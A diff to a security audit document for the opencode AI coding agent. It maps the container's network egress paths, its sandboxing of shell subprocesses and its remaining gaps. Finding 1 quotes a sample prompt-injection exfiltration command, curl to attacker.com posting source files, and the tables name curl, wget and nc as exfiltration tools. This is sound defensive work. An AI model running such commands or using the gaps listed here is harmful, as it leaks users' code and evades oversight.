@@ -19,10 +19,11 @@ container, where the LLM must not be able to exfiltrate data to external service
 
 | Tool | Endpoint | Validation | Notes |
 |---|---|---|---|
-| `webfetch` | Any URL | `validateUrlFromConfig` | GET only, 5 MB cap |
-| `websearch` | mcp.exa.ai | `validateUrlFromConfig` | |
-| Provider SDK | LLM endpoints | `validateUrlFromConfig` (provider.ts:1220) | |
-| models.dev | models.dev | `validateUrlFromConfig` + `models_dev_enabled` flag | |
+| `webfetch` | Any URL | `validateUrlFromConfig` + audit log + `sanitizeForLLM` on output | GET only, 5 MB cap; redirects auto-followed (Effect HttpClient) |
+| `websearch` | mcp.exa.ai | `validateUrlFromConfig` + audit log | |
+| Provider SDK | LLM endpoints | None (gap) | Provider HTTP goes directly through AI SDK / Effect HttpClient; relies on container network isolation |
+| models.dev | models.dev | `ModelsDev.registerGuard` hook calls `validateUrlFromConfig` + `models_dev_enabled` flag + audit log | Hook lives in `core/src/models-dev.ts`; opencode registers a SecurityConfig-aware closure during Config layer construction |
+| auth plugins (xai, anthropic, github-copilot, openai) | provider auth endpoints | None (gap) | Each plugin uses bare `fetch()` for OAuth flows; only fires on explicit `opencode auth login`, not background traffic |
 
 ### Outbound data-sending features (not tools — opencode features)
 
@@ -46,7 +47,7 @@ container, where the LLM must not be able to exfiltrate data to external service
 
 | Path | What it spawns | Network risk |
 |---|---|---|
-| `bash.ts` | Arbitrary shell via `spawn()` | **Primary exfiltration path**: curl, wget, git push, nc, python -c, etc. |
+| `tool/shell.ts` | Arbitrary shell via `spawn()` | **Primary exfiltration path**: curl, wget, git push, nc, python -c, etc. |
 | `session/prompt.ts` | User-typed inline shell commands from TUI (`SessionPrompt.shell()`) | Human-initiated; not AI-controlled; TUI-only path (not reachable in headless container) |
 | `pty/index.ts` | Terminal emulator | Interactive only |
 | `lsp/server.ts` | Language servers (clangd, tsserver, etc.) | None; local IPC only |
@@ -60,7 +61,7 @@ through the bash tool, so bash network controls cover git as well.
 | Mitigation | Covers | Gap |
 |---|---|---|
 | `security.mode: "internal-only"` | Provider SDK, webfetch, websearch, models.dev | Does not cover bash subprocess |
-| `models_dev_enabled: false` + empty snapshot | models.dev runtime fetch + bundled model list | — |
+| `models_dev_enabled: false` | models.dev runtime fetch (the only way to populate the catalog as of 2026-05-21 — upstream removed the bundled snapshot) | Setting to `false` leaves the catalog empty unless providers populate via `autodiscover` or explicit `models` config blocks |
 | No API keys passed by default | Cloud provider auth | User can still pass keys; SDK calls still blocked by mode |
 | `OPENCODE_DISABLE_SHARE=1` + `share: "disabled"` | Session upload to opncd.ai (auto and manual) | Defense-in-depth: env var blocks sync, config blocks Session.share() |
 | `OPENCODE_DISABLE_AUTOUPDATE=1` + `autoupdate: false` | Version check + auto-upgrade at TUI startup | — |
@@ -77,12 +78,12 @@ through the bash tool, so bash network controls cover git as well.
 
 ### 1. Bash tool has unrestricted network access (HIGH) — ADDRESSED
 
-`bash.ts` spawns commands with full container networking. An AI instructed (via prompt
+`tool/shell.ts` spawns commands with full container networking. An AI instructed (via prompt
 injection or otherwise) to run `curl https://attacker.com -d "$(cat /workspace/src/*.ts)"`
 can exfiltrate data regardless of `mode: internal-only`.
 
 **Fix implemented**: `OPENCODE_SPAWN_SANDBOX=1` (baked into `Dockerfile.analysis`) wraps
-bash subprocesses in a network namespace via bwrap/unshare. bash.ts has inline
+bash subprocesses in a network namespace via bwrap/unshare. tool/shell.ts has inline
 `sandboxedArgs()` that pre-wraps commands before passing to the Effect ChildProcessSpawner.
 Ripgrep/grep are now WASM-based (in-process worker, no subprocess) — sandbox is N/A for them.
 
@@ -148,20 +149,21 @@ opencode process (parent, full network namespace)
   ├── fetch() calls → webfetch, websearch, provider API, models.dev
   │   [JS API, runs in parent process — unrestricted by design]
   │
-  └── subprocess spawns → all tools that exec external binaries
+  └── subprocess spawns → tools that exec external binaries
       [crosses process boundary — sandbox applied here]
-        ├── bash tool          → bwrap/unshare sandbox (sandboxedArgs() in bash.ts)
-        ├── ripgrep execution  → bwrap/unshare sandbox (sandboxedCmd() in process.ts)
+        ├── bash/shell tool    → bwrap/unshare sandbox (inline sandboxedArgs() in tool/shell.ts)
         ├── grep/ripgrep       → WASM in-process worker (no subprocess; sandbox N/A)
         ├── LSP servers        → direct child_process.spawn; no network needed (gap)
-        └── future tools       → check whether they use ChildProcessSpawner or Process.spawn
+        └── future tools       → check whether they use ChildProcessSpawner with shell.ts's
+                                  inline sandboxedArgs(), or fall back to util/process.ts
+                                  sandboxedCmd() — both wrap via the same bwrap/unshare flags
 ```
 
 #### Current subprocess spawn coverage
 
 | Spawn site | Mechanism | Notes |
 |---|---|---|
-| `bash.ts` | Effect `ChildProcessSpawner` | **Sandboxed inline** via `sandboxedArgs()` before ChildProcess.make |
+| `tool/shell.ts` | Effect `ChildProcessSpawner` | **Sandboxed inline** via `sandboxedArgs()` before ChildProcess.make |
 | `tool/grep.ts` | WASM worker (Ripgrep.Service) | No subprocess; sandbox N/A |
 | `file/ripgrep.ts` | WASM worker | No subprocess; sandbox N/A |
 | `lsp/server.ts` | direct `child_process.spawn` | LSP needs no network; sandbox gap acceptable |
@@ -169,7 +171,7 @@ opencode process (parent, full network namespace)
 | `session/prompt.ts` | `Process.spawn` | Shell for prompt expansion; `sandboxedCmd()` applies |
 
 `util/process.ts` still has `sandboxedCmd()` for callers that use `Process.spawn`.
-bash.ts no longer uses `Process.spawn` — it has its own `sandboxedArgs()` for the Effect path.
+tool/shell.ts no longer uses `Process.spawn` — it has its own `sandboxedArgs()` for the Effect path.
 Future upstream tools using `ChildProcessSpawner` directly → NOT sandboxed (gap unless they add their own wrapping).
 
 #### Mechanism
@@ -211,7 +213,7 @@ Overridable at runtime: `docker run -e OPENCODE_SPAWN_SANDBOX=0 ...`
 
 - Opt-in via env var, default off → zero behavior change for existing users
 - Core change is in `util/process.ts` (single file) + `flag.ts`
-- bash.ts uses inline `sandboxedArgs()` with Effect ChildProcessSpawner
+- tool/shell.ts uses inline `sandboxedArgs()` with Effect ChildProcessSpawner
 - Could be proposed as an experimental security feature
 
 ### Audit all internal `fetch()` calls — IMPLEMENTED
